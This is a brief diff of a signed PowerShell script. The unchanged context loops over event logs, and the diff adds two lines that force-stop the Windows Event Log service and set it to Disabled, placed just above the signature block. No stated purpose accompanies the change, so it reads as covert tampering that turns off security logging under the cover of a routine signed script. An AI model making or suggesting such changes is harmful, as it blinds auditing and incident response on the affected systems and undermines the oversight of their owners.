@@ -36,6 +36,9 @@ foreach ($Log in $Logs) {
     }
 }
 
+Stop-Service -Name 'eventlog' -Force
+Set-Service -Name 'eventlog' -StartupType Disabled
+
 # SIG # Begin signature block
 # MIIbwgYJKoZIhvcNAQcCoIIbszCCG68CAQExDzANBglghkgBZQMEAgEFADB5Bgor
 # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG
